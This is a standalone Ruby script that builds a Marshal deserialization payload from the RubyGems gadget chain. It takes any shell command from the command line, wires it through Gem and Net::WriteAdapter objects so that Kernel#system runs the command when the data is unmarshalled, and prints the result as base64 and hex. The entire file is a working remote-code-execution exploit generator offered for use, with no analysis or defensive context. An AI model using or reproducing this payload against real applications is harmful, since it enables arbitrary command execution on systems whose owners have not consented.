require 'optparse'
require 'net/http'
require 'rubygems'
require 'base64'
require 'rubygems/package'

options = {}
OptionParser.new do |opts|
  opts.banner = "Usage: ruby script.rb [options] <COMMAND>"
  
  opts.on("--format FORMAT", [:base64, :hex, :all], "Output format: base64, hex, or all (default)") do |format|
    options[:format] = format
  end
end.parse!

# Check if a command is provided as a command-line argument
if ARGV.empty?
  puts "Usage: ruby script.rb [options] <COMMAND>"
  exit 1
end

command_to_execute = ARGV.join(' ')

# prevent the payload from running when we Marshal.dump it
wa1 = Net::WriteAdapter.new(Kernel, :system)
rs = Gem::RequestSet.allocate
rs.instance_variable_set('@sets', wa1)
rs.instance_variable_set('@git_set', command_to_execute)
wa2 = Net::WriteAdapter.new(rs, :resolve)
i = Gem::Package::TarReader::Entry.allocate
i.instance_variable_set('@read', 0)
i.instance_variable_set('@header', "aaa")
n = Net::BufferedIO.allocate
n.instance_variable_set('@io', i)
n.instance_variable_set('@debug_output', wa2)
t = Gem::Package::TarReader.allocate
t.instance_variable_set('@io', n)
r = Gem::Requirement.allocate
r.instance_variable_set('@requirements', t)

module Gem
  class Requirement
    def marshal_dump
      [@requirements]
    end
  end
end

payload = Marshal.dump([Gem::SpecFetcher, Gem::Installer, r])

case options[:format]
when :hex
  hex_payload = payload.unpack('H*').first
  puts hex_payload
when :base64
  encoded_payload = Base64.encode64(payload).tr("\n", '')
  puts encoded_payload
when :all
  encoded_payload = Base64.encode64(payload).tr("\n", '')
  hex_payload = payload.unpack('H*').first
  
  puts encoded_payload
  puts hex_payload
else
  # Default to printing both if no format specified
  encoded_payload = Base64.encode64(payload).tr("\n", '')
  hex_payload = payload.unpack('H*').first
  
  puts encoded_payload
  puts hex_payload
end
